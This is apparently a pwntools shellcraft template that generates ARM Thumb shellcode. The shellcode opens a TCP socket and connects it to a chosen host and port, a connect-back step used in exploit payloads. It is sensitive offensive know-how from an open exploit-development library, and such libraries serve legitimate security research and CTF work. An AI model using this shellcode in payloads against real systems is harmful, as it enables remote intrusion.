<% from pwnlib.shellcraft import thumb, common %>
<% import socket %>
<% from pwnlib.util import packing %>
<%page args="host, port, network='ipv4'"/>
<%docstring>
    Connects to the host on the specified port.
    Network is either 'ipv4' or 'ipv6'.
    Leaves the connected socket in R6.
</%docstring>
<%
    if network == 'ipv4':
        address_family = socket.AF_INET
    else:
        address_family = socket.AF_INET6
    
    info = socket.getaddrinfo(host, None, address_family)
    host = socket.inet_pton(address_family, info[0][4][0])
    sockaddr  = packing.p16(address_family)
    sockaddr += packing.p16(socket.htons(port))

    if network == 'ipv4':
        sockaddr += host
        sockaddr += '\x00' * (16 - len(sockaddr))
    else:
        sockaddr += packing.p32(0)
        sockaddr += host
        sockaddr += packing.p32(0)
%>\
    /* First create socket */
    ${thumb.mov('r7', 'SYS_socket')}
    ${thumb.mov('r0', address_family)}
    ${thumb.mov('r1', 'SOCK_STREAM')}
    eor r2, r2
    svc 1

    /* Save socket in r6 */
    mov r6, r0

    /* Create address structure on stack */
    ${thumb.pushstr(sockaddr, False)}

    /* Connect the socket */
    ${thumb.mov('r7', 'SYS_connect')}
    ${thumb.mov('r0', 'r6')}
    ${thumb.mov('r1', 'sp')}
    ${thumb.mov('r2', len(sockaddr))}
    svc 1
